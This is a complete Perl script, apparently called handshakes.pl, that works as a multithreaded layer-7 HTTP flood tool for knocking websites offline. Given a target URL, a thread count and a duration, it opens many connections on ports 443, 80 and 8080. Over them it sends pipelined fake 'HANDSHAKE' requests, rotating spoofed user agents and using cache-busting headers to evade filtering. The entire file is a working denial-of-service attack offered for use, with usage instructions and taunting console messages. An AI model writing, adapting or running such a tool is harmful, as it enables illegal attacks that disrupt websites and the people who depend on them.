#!/usr/bin/perl
use strict;
use warnings;
use IO::Socket::SSL;
use threads ('yield', 'exit' => 'threads_only', 'stringify');
use threads::shared;
use Time::HiRes qw(usleep);
use Socket qw(PF_INET SOCK_STREAM inet_aton sockaddr_in);
my @useragents = (
    "Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:15.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/6.2; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/13.2b11866 Mobile/16A366 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 12; SM-X906C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; U; Linux armv7l like Android; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/533.2+ Kindle/3.0+",
    "Mozilla/5.0 (Nintendo 3DS; U; ; en) Version/1.7412.EU",
    "Mozilla/5.0 (Linux; Android 13; SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; rv:39.0) Gecko/20100101 Firefox/39.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12H143 Safari/600.1.4",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:39.0) Gecko/20100101 Firefox/39.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H321",
    "Mozilla/5.0 (iPad; CPU OS 7_0_3 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B511 Safari/9537.53",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.1.17 (KHTML, like Gecko) Version/7.1 Safari/537.85.10"
);
my $method = "HANDSHAKE"; # Use a custom method to represent the handshake
my $hilo;
my @vals = ('a'..'z', 0..9);
my $randsemilla = "";
for (my $i = 0; $i < 30; $i++) {
    $randsemilla .= $vals[int(rand($#vals))];
}
sub socker {
    my ($remote, $port) = @_;
    my $sock;

    if ($port == 443) {
        # tcp ssl connection
        $sock = IO::Socket::SSL->new(
            PeerAddr => $remote,
            PeerPort => $port,
            Proto    => 'tcp',
        );
    } else {
        # For HTTP and other connections
        my ($iaddr, $paddr, $proto);
        $iaddr = inet_aton($remote) || return 0;
        $paddr = sockaddr_in($port, $iaddr) || return 0;
        $proto = getprotobyname('tcp');
        socket($sock, PF_INET, SOCK_STREAM, $proto) || return 0;
        connect($sock, $paddr) || return 0;
    }
    return $sock;
}
sub sender {
    my ($max, $peerto, $host, $time) = @_;
    my $sock;
    my $end_time = defined($time) ? time() + $time : undef;
    while (!defined($end_time) || time() < $end_time) {
        my $packet = "";
        my @ports = (443, 80, 8080); # Try ports 443 80 and 8080 for HTTPS and HTTP
        for my $port (@ports) {
            $sock = socker($host, $port);
            last if $sock;
        }

        unless ($sock) {
            print "\n[CONNECT-ERROR] Unable to connect: $!\n\n";
            usleep(1_000_000); # Time out
            next;
        }
for (my $i = 0; $i < $max; $i++) {
            my $useragent = $useragents[rand @useragents];
            unless ($useragent) {
                print "[ERROR] No valid user agent found.\n";
                last;
            } # URL config
            $packet .= join "", $method, " / HTTP/1.1\r\nHost: ", $host, "\r\nUser-Agent: ", $useragent, "\r\nIf-None-Match: ", $randsemilla, "\r\nIf-Modified-Since: Fri, 1 Dec 1969 23:00:00 GMT\r\nAccept: */*\r\nAccept-Language: es-es,es;q=0.8,en-us;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n";
        }
        $packet =~ s/Connection: Keep-Alive\r\n\r\n$/Connection: Close\r\n\r\n/;
        print $sock $packet;
    }
}
sub layer7 {
    $SIG{'KILL'} = sub { print "Killed...\n"; threads->exit(); };
    my $url = $ARGV[0];
    print "URL: " . $url . "\n";
    my $max = $ARGV[1];
    my $time = $ARGV[2];
    my ($protocol, $host) = ($url =~ m{^(https?)://([^/]+)});
    my $peerto = $protocol eq "https" ? 443 : 80; # Use if HTTPS errors and shit
    print join "", "[!] Launching ", $max, " threads!\n";
    print join "", "Target: ", $host, "\n\n";
    ($host, $peerto) = ($host =~ /(.*?):(.*)/) if ($host =~ /(.*?):(.*)/);
    for (my $v = 0; $v < $max; $v++) {
        threads->create('sender', ($max, $peerto, $host, $time));
    }
    print "[-] Launched!\n";
    print "[!] TLS Connected\n";
    print "[?] get kissed :3\n";
    sleep($time) if defined($time);
}
if ($#ARGV > 1) {
    layer7();
} else {
    die("(SCRIPT-HELP) Usage: perl handshakes.pl [url] [threads] [time]\n");
}